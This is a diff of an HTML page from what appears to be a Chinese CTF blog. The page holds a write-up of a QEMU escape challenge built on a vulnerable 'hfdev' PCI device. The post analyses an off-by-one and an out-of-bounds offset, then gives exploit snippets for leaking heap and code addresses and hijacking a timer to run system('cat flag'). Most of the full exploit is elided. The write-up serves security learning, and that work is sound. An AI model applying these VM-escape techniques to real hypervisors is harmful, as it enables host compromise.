@@ -227,7 +227,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -353,10 +353,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p><img src="/images/cdcd3a27/pasted-1.png" alt="pwn!"><br>off-by-one 藏得挺深啊</p>
+        <p><img src="/images/cdcd3a27/pasted-1.png" alt="pwn!"><br>
+off-by-one 藏得挺深啊</p>
 <span id="more"></span>
-
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>start_qemu.sh 文件如下</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>start_qemu.sh 文件如下</p>
 <pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
 #gdb -args \
 .&#x2F;qemu-system-x86_64 \
@@ -373,10 +374,10 @@
 -snapshot  \
 -nographic
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可以看到添加了一个叫 <code>hfdev</code> 的设备，将 qemu-system-x86_64 拖入 IDA，函数窗口搜索字符串 <code>hfdev</code> 找到对应函数进行分析</p>
 <p><img src="/images/cdcd3a27/pasted-2.png" alt="functions"></p>
-<h3 id="HfdevState"><a href="#HfdevState" class="headerlink" title="HfdevState"></a>HfdevState</h3><p>通过逆向分析可以知道，State 大概是这样一个结构体</p>
+<h3 id="HfdevState">HfdevState</h3>
+<p>通过逆向分析可以知道，State 大概是这样一个结构体</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">HfdevState</span>
 <span class="token punctuation">&#123;</span>
   <span class="token keyword">char</span> pub<span class="token punctuation">[</span><span class="token number">2400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -395,15 +396,23 @@
   <span class="token keyword">char</span> padding<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="hfdev-class-init"><a href="#hfdev-class-init" class="headerlink" title="hfdev_class_init"></a>hfdev_class_init</h3><p>可以看到 vendor_id 和 device_id<br><img src="/images/cdcd3a27/pasted-3.png" alt="hfdev_class_init"></p>
-<p>利用 lspci，找到对应的设备 resource 信息，可以找到 PMIO 的端口基址<br><img src="/images/cdcd3a27/pasted-16.png" alt="lspci"></p>
-<h3 id="pci-hfdev-realize"><a href="#pci-hfdev-realize" class="headerlink" title="pci_hfdev_realize"></a>pci_hfdev_realize</h3><p>只提供 PMIO<br><img src="/images/cdcd3a27/pasted-4.png" alt="pci_hfdev_realize"></p>
+<h3 id="hfdev-class-init">hfdev_class_init</h3>
+<p>可以看到 vendor_id 和 device_id<br>
+<img src="/images/cdcd3a27/pasted-3.png" alt="hfdev_class_init"></p>
+<p>利用 lspci，找到对应的设备 resource 信息，可以找到 PMIO 的端口基址<br>
+<img src="/images/cdcd3a27/pasted-16.png" alt="lspci"></p>
+<h3 id="pci-hfdev-realize">pci_hfdev_realize</h3>
+<p>只提供 PMIO<br>
+<img src="/images/cdcd3a27/pasted-4.png" alt="pci_hfdev_realize"></p>
 <p>同时还可以看到，创建了一个 timer 和 一个 QEMUBH</p>
 <p>这两个东西了解不多，翻源码看了看，大致就是都可以用来做异步回调的事情</p>
 <p>可以看到 timer 的回调函数是 hfdev_func，QEMUBH 的回调函数是 hfdev_process</p>
-<h3 id="hfdev-func"><a href="#hfdev-func" class="headerlink" title="hfdev_func"></a>hfdev_func</h3><p>可以看到，timer 的操作是把 req_addr 指向的数据拷贝到 write_buf 中，同时这个偏移 pos 是可以无限增长的，如果可以多次触发 timer，就能让这个越界越到后面的数据，包括 timer 和 bh 的指针<br><img src="/images/cdcd3a27/pasted-6.png" alt="hfdev_func"></p>
-<h3 id="hfdev-process"><a href="#hfdev-process" class="headerlink" title="hfdev_process"></a>hfdev_process</h3><p>开头先从指定的物理地址读取一个结构体<br><img src="/images/cdcd3a27/pasted-8.png" alt="Req"></p>
+<h3 id="hfdev-func">hfdev_func</h3>
+<p>可以看到，timer 的操作是把 req_addr 指向的数据拷贝到 write_buf 中，同时这个偏移 pos 是可以无限增长的，如果可以多次触发 timer，就能让这个越界越到后面的数据，包括 timer 和 bh 的指针<br>
+<img src="/images/cdcd3a27/pasted-6.png" alt="hfdev_func"></p>
+<h3 id="hfdev-process">hfdev_process</h3>
+<p>开头先从指定的物理地址读取一个结构体<br>
+<img src="/images/cdcd3a27/pasted-8.png" alt="Req"></p>
 <p>大概长这样：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">Req</span>
 <span class="token punctuation">&#123;</span>
@@ -442,23 +451,35 @@
   <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1019</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>大致对应三种操作</p>
-<h4 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h4><p>拷贝 write_buf 中的数据到指定的物理地址<br><img src="/images/cdcd3a27/pasted-9.png" alt="op reader"></p>
-<h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p>可以看到这里使用了 timer_mod，翻看源码可以了解到这是设置定时器，触发即可回调 hfdev_func，同时这里有个变量决定了是否可以调用 timer_mod，而且 hfdev_func 里面也修改这个变量使其只能调用一次<br><img src="/images/cdcd3a27/pasted-15.png" alt="op timer"></p>
-<h4 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h4><p>这里有两种操作，首先 0x2202 对应的是把 data 进行一定的编码后存进 write_buf 里<br><img src="/images/cdcd3a27/pasted-11.png" alt="op encoder 1"></p>
-<p>0x2022 则是对 write_buf 和 data 异或编码<br><img src="/images/cdcd3a27/pasted-12.png" alt="op encoder 2"></p>
+<h4 id="Reader">Reader</h4>
+<p>拷贝 write_buf 中的数据到指定的物理地址<br>
+<img src="/images/cdcd3a27/pasted-9.png" alt="op reader"></p>
+<h4 id="Timer">Timer</h4>
+<p>可以看到这里使用了 timer_mod，翻看源码可以了解到这是设置定时器，触发即可回调 hfdev_func，同时这里有个变量决定了是否可以调用 timer_mod，而且 hfdev_func 里面也修改这个变量使其只能调用一次<br>
+<img src="/images/cdcd3a27/pasted-15.png" alt="op timer"></p>
+<h4 id="Encoder">Encoder</h4>
+<p>这里有两种操作，首先 0x2202 对应的是把 data 进行一定的编码后存进 write_buf 里<br>
+<img src="/images/cdcd3a27/pasted-11.png" alt="op encoder 1"></p>
+<p>0x2022 则是对 write_buf 和 data 异或编码<br>
+<img src="/images/cdcd3a27/pasted-12.png" alt="op encoder 2"></p>
 <p>同时可以看到这里比较用的是 <code>&gt;=</code>，存在off-by-one（可恶，比赛的时候就没看出来）</p>
-<h3 id="hfdev-port-write"><a href="#hfdev-port-write" class="headerlink" title="hfdev_port_write"></a>hfdev_port_write</h3><p>写端口这里就是设置各种参数，还有就是触发 bh 的事件回调的操作<br><img src="/images/cdcd3a27/pasted-13.png" alt="hfdev_port_write"></p>
-<h3 id="hfdev-port-read"><a href="#hfdev-port-read" class="headerlink" title="hfdev_port_read"></a>hfdev_port_read</h3><p>读取各种参数，没啥好说的<br><img src="/images/cdcd3a27/pasted-14.png" alt="hfdev_port_read"></p>
-<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>现有的信息：</p>
+<h3 id="hfdev-port-write">hfdev_port_write</h3>
+<p>写端口这里就是设置各种参数，还有就是触发 bh 的事件回调的操作<br>
+<img src="/images/cdcd3a27/pasted-13.png" alt="hfdev_port_write"></p>
+<h3 id="hfdev-port-read">hfdev_port_read</h3>
+<p>读取各种参数，没啥好说的<br>
+<img src="/images/cdcd3a27/pasted-14.png" alt="hfdev_port_read"></p>
+<h2 id="利用分析">利用分析</h2>
+<p>现有的信息：</p>
 <ol>
 <li>timer 的 pos 不断增长的过程中可以越界</li>
 <li>pos 越界后，利用 reader 可以读到 write_buf 后面的信息，比如 timer 对象指针和 bh 对象指针</li>
 <li>pos 的越界，也让 encoder 可以修改 timer 指针和 bh 指针，可以伪造这两个对象劫持程序执行流</li>
 <li>encoder 的 0x2022 功能存在 off-by-one</li>
 </ol>
-<h3 id="off-by-one-修改-checker"><a href="#off-by-one-修改-checker" class="headerlink" title="off-by-one 修改 checker"></a>off-by-one 修改 checker</h3><p>首先得控制 checker （即 can_run_hfdev_func）变量，以进行多次触发 timer，具体步骤如下：</p>
+<h3 id="off-by-one-修改-checker">off-by-one 修改 checker</h3>
+<p>首先得控制 checker （即 can_run_hfdev_func）变量，以进行多次触发 timer，具体步骤如下：</p>
 <ol>
 <li>使用 encoder 0x2202 功能，让 pos = 0x200</li>
 <li>触发 timer，pos += 0x100</li>
@@ -497,8 +518,8 @@ req<span class="token punctuation">.</span>encoder<span class="token punctuation
 <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Leak-Heap-Address"><a href="#Leak-Heap-Address" class="headerlink" title="Leak Heap Address"></a>Leak Heap Address</h3><p>可以控制 checker 后，就可以随意多次触发 timer 了，接着下面的步 leak heap</p>
+<h3 id="Leak-Heap-Address">Leak Heap Address</h3>
+<p>可以控制 checker 后，就可以随意多次触发 timer 了，接着下面的步 leak heap</p>
 <ol>
 <li>触发 timer，pos+=0x10，使其越界到 req_addr 指针的位置</li>
 <li>reader，读出 req_addr 指针</li>
@@ -535,8 +556,8 @@ timer_list_ptr <span class="token operator">=</span> heap <span class="token ope
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"heap address: %#lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_list_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_list_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Leak-Code-Base"><a href="#Leak-Code-Base" class="headerlink" title="Leak Code Base"></a>Leak Code Base</h3><p>接下来要 bypass PIE，泄露程序基址</p>
+<h3 id="Leak-Code-Base">Leak Code Base</h3>
+<p>接下来要 bypass PIE，泄露程序基址</p>
 <ol>
 <li>此时 pos=0x310，给 timer 设置的触发延时长一点</li>
 <li>利用 encoder 0x2022 功能，再 timer 触发前，修改 req_addr</li>
@@ -580,14 +601,15 @@ binsh <span class="token operator">=</span> cbase <span class="token operator">+
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cbase = %#lx\n"</span><span class="token punctuation">,</span> cbase<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"system = %#lx\n"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"binsh = %#lx\n"</span><span class="token punctuation">,</span> binsh<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Hijack-Timer"><a href="#Hijack-Timer" class="headerlink" title="Hijack Timer"></a>Hijack Timer</h3><ol>
+<h3 id="Hijack-Timer">Hijack Timer</h3>
+<ol>
 <li>Req 结构体上，构造 fake timer</li>
 <li>此时 pos=0x318，使用 0x2022 功能修改 timer 指针指向 fake timer</li>
 <li>触发 timer 执行 <code>system(&quot;cat flag&quot;)</code></li>
 </ol>
 <hr>
-<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>完整 exp 如下：</p>
+<h3 id="Exp">Exp</h3>
+<p>完整 exp 如下：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
@@ -897,18 +919,19 @@ binsh <span class="token operator">=</span> cbase <span class="token operator">+
 
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><blockquote>
+<h2 id="写在最后">写在最后</h2>
+<blockquote>
 <p>跟踪 timer_mod 源码，发现会调用 timer_list 对象里的某个函数指针，伪造 timer_list 就可以不用等回调直接劫持程序控制流了</p>
 </blockquote>
 <blockquote>
 <p>调试是真的麻烦，可以多借助条件断点来调试</p>
 </blockquote>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
-<li>感谢 @Mr.R 师傅的 writeup </li>
-<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</a></li>
-<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8</a></li>
+<h3 id="参考">参考</h3>
+<ol>
+<li>感谢 @Mr.R 师傅的 writeup</li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://a1ex.online/2021/09/17/qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2021/09/17/qemu逃逸学习/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">http://blog.leanote.com/post/xp0int/2022-虎符网络安全</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/qemu/qemu/blob/v6.1.1/util/qemu-timer.c#L356">https://github.com/qemu/qemu/blob/v6.1.1/util/qemu-timer.c#L356</a></li>
 </ol>
 
@@ -1002,13 +1025,13 @@ binsh <span class="token operator">=</span> cbase <span class="token operator">+
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
